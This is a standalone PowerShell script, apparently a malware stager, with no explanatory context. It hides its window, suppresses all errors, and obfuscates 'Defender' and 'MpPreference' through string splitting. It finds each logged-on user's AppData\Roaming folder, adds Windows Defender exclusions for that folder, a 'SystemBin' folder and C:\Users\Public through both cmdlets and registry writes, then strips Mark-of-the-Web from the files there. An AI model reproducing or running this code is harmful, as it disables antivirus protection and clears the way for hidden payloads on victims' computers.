$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
Add-Type -Name Win -Member $windowCode -Namespace Native
[Native.Win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess()).MainWindowHandle, 0)

Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'

$d = "De" + "fe" + "nd" + "er"
$mp = "M" + "pPr" + "eference"
$msoft = "Mi" + "cro" + "soft"
$win = "Wi" + "nd" + "ows"

function Get-AppDataRoamingPath {
    $ErrorActionPreference = 'SilentlyContinue'
    $finalPath = $null
    $pathFile = "C:\Users\Public\path.txt"
    
    try {
        if (Test-Path $pathFile -ErrorAction SilentlyContinue) {
            $storedPath = Get-Content $pathFile -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($storedPath -and (Test-Path $storedPath -ErrorAction SilentlyContinue)) {
                $finalPath = $storedPath
            }
        }
    } catch { }
    
    if (-not $finalPath) {
        $candidatePaths = @{}
        
        try {
            $activeUsers = Get-WmiObject -Query "SELECT * FROM Win32_LoggedOnUser" -ErrorAction SilentlyContinue
            foreach ($user in $activeUsers) {
                try {
                    if ($user.Antecedent -match 'Domain="([^"]+)",Name="([^"]+)"') {
                        $username = $matches[2]
                        if ($username -notmatch '^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE)$') {
                            $sessions = Get-WmiObject Win32_LogonSession -Filter "LogonType = 2 OR LogonType = 10" -ErrorAction SilentlyContinue
                            foreach ($session in $sessions) {
                                try {
                                    $assoc = Get-WmiObject -Query "Associators of {Win32_LogonSession.LogonId=$($session.LogonId)} Where AssocClass=Win32_LoggedOnUser Role=Dependent" -ErrorAction SilentlyContinue
                                    if ($assoc.Name -eq $username) {
                                        $path = "C:\Users\$username\AppData\Roaming"
                                        if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                                            $candidatePaths[$path] = $true
                                        }
                                    }
                                } catch { }
                            }
                        }
                    }
                } catch { }
            }
        } catch { }
        
        try {
            $procs = Get-WmiObject Win32_Process -Filter "Name = 'explorer.exe'" -ErrorAction SilentlyContinue
            foreach ($p in $procs) {
                try {
                    $owner = $p.GetOwner()
                    if ($owner.User -and $owner.User -notmatch '^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE)$') {
                        $path = "C:\Users\$($owner.User)\AppData\Roaming"
                        if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$path] = $true
                        }
                    }
                } catch { }
            }
        } catch { }
        
        try {
            $sids = Get-ChildItem "Registry::HKEY_USERS" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "S-1-5-21-\d+-\d+-\d+-\d+$" }
            foreach ($sid in $sids) {
                try {
                    $sidStr = $sid.PSChildName
                    $sf = "Registry::HKEY_USERS\$sidStr\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
                    $ve = "Registry::HKEY_USERS\$sidStr\Volatile Environment"
                    
                    try {
                        $shellPath = (Get-ItemProperty -Path $sf -ErrorAction SilentlyContinue).AppData
                        if ($shellPath -and (Test-Path $shellPath -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$shellPath] = $true
                        }
                    } catch { }
                    
                    try {
                        $volatilePath = (Get-ItemProperty -Path $ve -ErrorAction SilentlyContinue).APPDATA
                        if ($volatilePath -and (Test-Path $volatilePath -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$volatilePath] = $true
                        }
                    } catch { }
                } catch { }
            }
        } catch { }
        
        try {
            Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WTS {
    [DllImport("wtsapi32.dll", SetLastError = true)]
    public static extern bool WTSQuerySessionInformation(IntPtr hServer, int sessionId, int wtsInfoClass, out IntPtr ppBuffer, out uint pBytesReturned);
    [DllImport("wtsapi32.dll")] public static extern void WTSFreeMemory(IntPtr pMemory);
    [DllImport("kernel32.dll")] public static extern uint WTSGetActiveConsoleSessionId();
}
"@ -ErrorAction SilentlyContinue
            
            try {
                $buffer = [IntPtr]::Zero
                $sessionId = [WTS]::WTSGetActiveConsoleSessionId()
                $bytesReturned = 0
                $result = [WTS]::WTSQuerySessionInformation([IntPtr]::Zero, $sessionId, 5, [ref]$buffer, [ref]$bytesReturned)
                if ($result) {
                    $user = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($buffer)
                    [WTS]::WTSFreeMemory($buffer)
                    if ($user) {
                        $path = "C:\Users\$user\AppData\Roaming"
                        if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$path] = $true
                        }
                    }
                }
            } catch { }
        } catch { }
        
        try {
            $profiles = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" -ErrorAction SilentlyContinue |
                        Where-Object { $_.PSChildName -match "S-1-5-21-\d+-\d+-\d+-\d+$" }
            foreach ($profile in $profiles) {
                try {
                    $localPath = (Get-ItemProperty $profile.PSPath -ErrorAction SilentlyContinue).ProfileImagePath
                    if ($localPath -and $localPath -notlike "*systemprofile*") {
                        $path = Join-Path $localPath "AppData\Roaming"
                        if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$path] = $true
                        }
                    }
                } catch { }
            }
        } catch { }
        
        try {
            foreach ($path in $candidatePaths.Keys) {
                $systemBinPath = Join-Path $path "SystemBin"
                if (Test-Path $systemBinPath -ErrorAction SilentlyContinue) {
                    $finalPath = $path
                    break
                }
            }
        } catch { }
        
        if (-not $finalPath -and $candidatePaths.Count -gt 0) {
            try {
                $finalPath = $candidatePaths.Keys | Select-Object -First 1
            } catch { }
        }
        
        if ($finalPath) {
            try {
                Set-Content -Path $pathFile -Value $finalPath -Force -ErrorAction SilentlyContinue
            } catch { }
        }
    }
    
    return $finalPath
}

function Add-DefenderExclusions {
    param(
        [string]$AppDataPath
    )
    
    if (-not $AppDataPath) { return }
    
    $systemBinPath = Join-Path $AppDataPath "SystemBin"
    $publicPath = "C:\Users\Public"
    
    try {
        $addCmd = "Add-" + $mp
        $param = "-Ex" + "clusion" + "Path"
        
        # Add exclusion for the entire AppData\Roaming path
        $expression1 = "$addCmd $param '$AppDataPath'"
        Invoke-Expression $expression1
        
        # Add exclusion for the SystemBin subdirectory if it exists
        if (Test-Path $systemBinPath) {
            $expression2 = "$addCmd $param '$systemBinPath'"
            Invoke-Expression $expression2
        }
        
        # Add exclusion for C:\Users\Public
        $expression3 = "$addCmd $param '$publicPath'"
        Invoke-Expression $expression3
        
    } catch { }
    
    try {
        $regPath = "HKLM:\SOFTWARE\$msoft\$win $d\Exclusions\Paths"
        if (Test-Path $regPath) {
            # Registry exclusion for the entire AppData\Roaming path
            New-ItemProperty -Path $regPath -Name $AppDataPath -PropertyType DWord -Value 0 -Force | Out-Null
            
            # Registry exclusion for SystemBin if it exists
            if (Test-Path $systemBinPath) {
                New-ItemProperty -Path $regPath -Name $systemBinPath -PropertyType DWord -Value 0 -Force | Out-Null
            }
            
            # Registry exclusion for C:\Users\Public
            New-ItemProperty -Path $regPath -Name $publicPath -PropertyType DWord -Value 0 -Force | Out-Null
        }
    } catch { }
    
    # Return paths for further processing if needed
    if (Test-Path $systemBinPath) {
        return @{
            AppDataPath = $AppDataPath
            SystemBinPath = $systemBinPath
            PublicPath = $publicPath
        }
    } else {
        return @{
            AppDataPath = $AppDataPath
            PublicPath = $publicPath
        }
    }
}

function Remove-MOTW {
    param(
        [string]$FolderPath
    )
    
    if (-not $FolderPath -or -not (Test-Path $FolderPath)) { return }
    
    try {
        $files = Get-ChildItem -Path $FolderPath -File -Recurse -Force -ErrorAction SilentlyContinue
        
        foreach ($file in $files) {
            try {
                $streamPath = $file.FullName + ":Zone.Identifier"
                if (Test-Path $streamPath) {
                    Remove-Item -Path $streamPath -Force -ErrorAction SilentlyContinue
                }
                
                Unblock-File -Path $file.FullName -ErrorAction SilentlyContinue
            } catch { }
        }
    } catch { }
}

# FIXED EXECUTION SECTION
try {
    $appDataPath = Get-AppDataRoamingPath
    
    if ($appDataPath) {
        # Store the hashtable of paths
        $paths = Add-DefenderExclusions -AppDataPath $appDataPath
        
        if ($paths) {
            # Remove MOTW from SystemBin if it exists
            if ($paths.SystemBinPath -and (Test-Path $paths.SystemBinPath)) {
                Remove-MOTW -FolderPath $paths.SystemBinPath
            }
            
            # Remove MOTW from C:\Users\Public
            if ($paths.PublicPath -and (Test-Path $paths.PublicPath)) {
                Remove-MOTW -FolderPath $paths.PublicPath
            }
        }
    }
} catch { }

[System.GC]::Collect()